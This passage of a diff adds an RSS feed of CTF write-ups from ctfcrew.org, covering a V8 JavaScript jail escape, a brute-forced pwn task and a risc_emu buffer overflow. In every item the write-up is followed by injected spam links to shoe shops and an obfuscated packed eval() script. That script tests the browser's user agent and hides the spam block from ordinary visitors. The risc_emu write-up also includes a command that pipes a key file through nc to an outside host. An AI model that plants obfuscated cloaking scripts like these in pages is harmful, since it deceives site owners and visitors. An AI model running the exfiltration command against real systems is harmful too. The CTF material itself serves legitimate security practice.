a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/eXPLicit.zip&quot; type=&quot;application/zip; length=267098&quot;&gt;eXPLicit.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 22 Sep 2014 22:44:15 +0000</pubDate>
+ <dc:creator>Dil4rd</dc:creator>
+ <guid isPermaLink="false">68 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/68#comments</comments>
+</item>
+<item>
+ <title>JavaScript jail</title>
+ <link>https://ctfcrew.org/writeup/62</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/22&quot;&gt;SecuInside CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;We have an ip address and a port. Connected using netcat we got V8 JavaScript shell. &lt;em&gt;print(Object.keys(this)) &lt;/em&gt;gives us all global objects available: print, quit, checker, check.&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;&lt;em&gt;print(check) &lt;/em&gt;gives our pwn target:&lt;/p&gt;&lt;pre class=&quot;brush: jscript; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;function (rand) {
+	function stage1() {
+		var a = Array.apply(null, new Array(Math.floor(Math.random() * 20) + 10)).map(function () {return Math.random() * 0x10000;});
+		var b = rand(a.length);
+
+		if (!Array.isArray(b)) {
+			print(&quot;You&#039;re a cheater!&quot;);
+			return false;
+		}
+
+		if (b.length &amp;lt; a.length) {
+			print(&quot;hmm.. too short..&quot;);
+			for (var i = 0, n = a.length - b.length; i &amp;lt; n; i++) {
+				delete b[b.length];
+				b[b.length] = [Math.random() * 0x10000];
+			}
+		} else if (b.length &amp;gt; a.length) {
+			print(&quot;hmm.. too long..&quot;);
+			for (var i = 0, n = b.length - a.length; i &amp;lt; n; i++)
+				Array.prototype.pop.apply(b);
+		}
+
+		for (var i = 0, n = b.length; i &amp;lt; n; i++) {
+			if (a[i] != b[i]) {
+				print(&quot;ddang~~&quot;);
+				return false;
+			}
+		}
+
+		return true;
+	}
+
+	function stage2() {
+		var a = Array.apply(null, new Array((myRand() % 20) + 10)).map(function () {return myRand() % 0x10000;});
+		var b = rand(a.length);
+
+		if (!Array.isArray(b)) {
+			print(&quot;You&#039;re a cheater!&quot;);
+			return false;
+		}
+
+		if (b.length &amp;lt; a.length) {
+			print(&quot;hmm.. too short..&quot;);
+			for (var i = 0, n = a.length - b.length; i &amp;lt; n; i++) {
+				delete b[b.length];
+				b[b.length] = [Math.random() * 0x10000];
+			}
+		} else if (b.length &amp;gt; a.length) {
+			print(&quot;hmm.. too long..&quot;);
+			for (var i = 0, n = b.length - a.length; i &amp;lt; n; i++)
+				Array.prototype.pop.apply(b);
+		}
+
+		for (var i = 0, n = b.length; i &amp;lt; n; i++) {
+			if (a[i] != b[i]) {
+				print(&quot;ddang~~&quot;);
+				return false;
+			}
+		}
+
+		return true;
+	}
+
+	print(&quot;stage1&quot;);
+
+	if (!stage1())
+		return;
+
+	print(&quot;stage2&quot;);
+
+	if (!stage2())
+		return;
+
+	print(&quot;awesome!&quot;);
+	return flag;
+}&lt;/pre&gt;&lt;p&gt;The flag is contained in closure made by calling &lt;em&gt;checker&lt;/em&gt;. Since there is no any legal method to take variables from closure we have to deceive &lt;em&gt;check&lt;/em&gt; tests somehow. It&#039;s JavaScript baby, we can redefine everything. The simplest solution is to redefine &lt;em&gt;Array.apply&lt;/em&gt; in a way it returns empty array and to return empty array from our &lt;em&gt;rand&lt;/em&gt; function. Obviously two empty arrays are the same size and have same elements. Let&#039;s do it:&lt;/p&gt;&lt;pre class=&quot;brush: jscript; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;Array.apply = function() {return [];};
+function rand() {return [];}
+check(rand);&lt;/pre&gt;&lt;p&gt;This is it.&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;Sportswear free shipping&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeaggeshop/p/nike-air-force-1-07-essential-blanche-et-or-femme-172723.html&quot;&gt;Nike Air Force 1&#039;07 Essential blanche et or femme - Chaussures Baskets femme - Gov&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 02 Jun 2014 09:14:59 +0000</pubDate>
+ <dc:creator>villytiger</dc:creator>
+ <guid isPermaLink="false">62 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/62#comments</comments>
+</item>
+<item>
+ <title>Guess the flag (vuln 100)</title>
+ <link>https://ctfcrew.org/writeup/45</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/17&quot;&gt;RuCTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;There is given service raised at vuln1.quals.ructf.org:16712 and it&#039;s ELF 32-bit executable source file.&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;At first I tried to reverse executable but i&#039;m not a reverse-engeneering-guy so i got nothing :)&lt;/p&gt;&lt;p&gt;Because of task&#039;s cost is 100 and I thought than it can&#039;t be difficult I connect to vuln1.quals.ructf.org:16712 and started to brute inputs. And I was surprised that&amp;nbsp;after several attempts I got flag&amp;nbsp;&lt;strong&gt;RUCTF_f4205156a73b7bd143ab06e7722e3c81f72b8429 with&amp;nbsp;&lt;/strong&gt;&lt;span style=&quot;font-weight: 600;&quot;&gt;&quot;\&quot; as&amp;nbsp;&lt;/span&gt;&lt;strong&gt;input string :)&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.juzsports.com/&quot;&gt;Nike shoes&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.pochta.uz/en/facgikshop/shopping/men/nike/items.aspx&quot;&gt;Nike for Men&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/guess.zip&quot; type=&quot;application/zip; length=3408&quot;&gt;guess.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 17 Mar 2014 10:34:41 +0000</pubDate>
+ <dc:creator>azrael</dc:creator>
+ <guid isPermaLink="false">45 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/45#comments</comments>
+</item>
+<item>
+ <title>risc_emu</title>
+ <link>https://ctfcrew.org/writeup/37</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/15&quot;&gt;Boston Key Party 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Task:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Pwning : 100&lt;/p&gt;&lt;p&gt;nobody cares about this service nc 54.218.22.41 4545&lt;/p&gt;&lt;p&gt;http://bostonkeyparty.net/challenges/emu-c7c4671145c5bb6ad48682ec0c58b831&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;strong&gt;Solution:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Connected to the server I was prompted to enter some byte code of the RISC CPU in base64. OK, let&#039;s look at the executable through disasm magnifier. After downloading &lt;em&gt;file&lt;/em&gt; command said me that it is ELF for x86-64. I started reading opcodes in the binary and found that after decoding base64 input in this beautiful C++ code &lt;em&gt;memcpy&lt;/em&gt; betrayer is used to copy decoded data into some global buffer. Look at this (dump from my mind):&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/risc_emu1.png&quot; alt=&quot;&quot; height=&quot;140&quot; width=&quot;368&quot;&gt;&lt;/p&gt;&lt;p&gt;So, that&#039;s pretty easy to get what we need. Just send 152 bytes with special address on the end. The first byte of the buffer is checked for being greater or equal to 9, and after that &lt;em&gt;main::fun&lt;/em&gt; is called with &lt;em&gt;buffer + 1&lt;/em&gt; as the first parmeter.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/risc_emu2.png&quot; alt=&quot;&quot; height=&quot;347&quot; width=&quot;823&quot;&gt;&lt;/p&gt;&lt;p&gt;There is only one problem remained. This is the gap between the byte code buffer and the function pointer. After doing &lt;em&gt;memcpy&lt;/em&gt; our risc emulator checks that first 4 bytes of this gap still contain some cookie written in the beginning of the &lt;em&gt;main&lt;/em&gt; function. Here is the mind dump with the function producing this cookie:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/risc_emu3.png&quot; alt=&quot;&quot; height=&quot;255&quot; width=&quot;486&quot;&gt;&lt;/p&gt;&lt;p&gt;Now we just need to brute force the server time (hope the server is properly synced) and run &lt;em&gt;system(&quot;cat key | nc ctfcrew.org 1337&quot;)&lt;/em&gt;. Or run &lt;em&gt;ls -al&lt;/em&gt; if you aren&#039;t assured about flag file name. See the full solution in the attachment.&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.sneakersbe.com/&quot;&gt;Authentic Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;http://www.sb-roscoff.fr/en/bdeibishop/releases&quot;&gt;Releases Nike Shoes&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Plain text icon&quot; title=&quot;text/plain&quot; src=&quot;/modules/file/icons/text-plain.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/fuck-the-emu.cpp_.txt&quot; type=&quot;text/plain; length=3216&quot;&gt;fuck-the-emu.cpp_.txt&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Wed, 05 Mar 2014 13:59:22 +0000</pubDate>
+ <dc:creator>villytiger</dc:creator>
+ <guid isPermaLink="false">37 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/37#comments</comments>
+</item>
+</channel>
+</rss>
